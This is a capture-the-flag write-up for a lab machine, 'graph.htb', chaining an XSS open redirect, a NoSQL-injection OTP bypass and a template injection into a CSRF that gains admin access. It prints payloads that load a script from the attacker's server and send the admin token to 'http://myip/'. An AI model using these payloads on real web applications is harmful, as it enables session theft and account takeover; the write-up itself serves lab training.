@@ -1,0 +1,72 @@
+Nmap return 2 open ports. 22 & 80
+
+On the web page i found an xss in the html code:
+
+	if(param[0] === "?redirect"){
+	window.location.replace(param[1]);
+	}
+ # http://graph.htb/?redirect=javascript:alert(1)
+Ans i also found an email on a <form> class:
+	<form action="mailto:edward.yerburgh@gmail.com"  enctype="text/plain" method="post">
+	Mail: edward.yerburgh@gmail.com
+
+// EDIT: the mail is out of scope 'cause it's a 'gmail' account
+
+Next thing i did was enumerate the subdomains and add it to "/etc/hosts".
+Subdomains found:
+	internal.graph.htb
+	internal-api.graph.htb
+
+On the internal-api.graph.htb there's a /graphql directory that contains a "graphql query playground".
+Using "GraphQLVoyager" tool u can visualize the graphql db. Click on "Change Schema" > "Introspection" > "Copy Introspection Query"
+And then paste the JSON payload that returns the internal-api.graph.htb
+
+Now we'll start playing with the querys.
+
+The whole exploit to pass the first part of the user shell (that was getting admin control on the portal access) is a combination
+between a CSTI, XSS & CSRF
+
+XSS:
+	This was the easiest part 'cause we found the exploit at the beginning of the ctf on "graph.htb" but to exploit it we have to
+	redirect it to a js script that will execute the csrf
+	#  http://graph.htb/?redirect=javascript:document.body.innerHTML%2B%3D%27%3Cscript%20src%3d%22http://myip/csrf.js%22%3E%3C/script%3E%27
+CSTI:
+	This exploit is on the profile directory on "internal.graph.htb" but to get there first i have to register my own profile.
+
+	On the "register" directory after submiting the 'emai' it's going to ask for a 4 digit otp passcode.
+	To bypass it i did the following: 
+		Capture the graphql POST request with burpsuite and then generate an error to get further knowledge from the machine
+		# {"operationName":"IntrospectionQuery","variables":{},"query":"ss"}
+		With this i can assume that for the json response i can use nosql injection & i was right :).
+		# {"email":"user@graph.htb","code":{"$ne":"1234"}}
+	
+	After completing all those things u can get access to the profile directory & on the "name" or "last name" field u will
+	find the CSTI:
+		# {{constructor.constructor('fetch("http://myip/" + localStorage.getItem("adminToken"))')()}}
+CSRF:
+	This one was the hardest part of the entire exploit and to get it i did the next thing:
+	
+	On the inbox part there is a message from an admin that ask u to upload a url to confirm you'r profile.
+	U can abuse this part by uploading a malicious url, like the one above, from the xss part.
+	'Cause it's gonna block the request if u put directly the url of you'r web server.
+
+	On "internal-api.graph.htb" search for de admin id.
+	This will be helpfull to get the adminToken
+		# query tasks{
+		#    tasks(username:"Larry"){
+		#      Assignedto
+		#       username
+		#       text
+		#       taskstatus
+		#       type
+		#     }
+		#  }	
+	
+	After that the only thing to do is write the csrf.js payload.
+		Using the CSTI to change the name to alert the adminToken on our web server.
+		The inbox to upload the malicious url.
+		And  the XSS to redirect it to our own web server
+
+		The payload on a graphql POST request.
+	
+	And that's all :D
